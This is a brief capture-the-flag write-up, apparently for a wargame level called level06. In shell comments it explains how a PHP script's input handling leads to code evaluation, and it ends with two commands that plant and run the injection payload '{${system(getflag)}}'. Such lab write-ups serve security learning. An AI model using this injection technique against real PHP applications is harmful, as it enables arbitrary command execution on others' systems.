# there is a bin and a php script in the home
# once we understood the php script, it got clearer
# the second arg is useless.
# the first arg must be like [x EXPLOIT ]
# then transformed in y("EXPLOIT")
# so we tried {${system(getflag)}}
# and the flag appeared.
# 
# echo "[x {${system(getflag)}}]" > /tmp/file
# ~/level06 /tmp/file dummy_arg
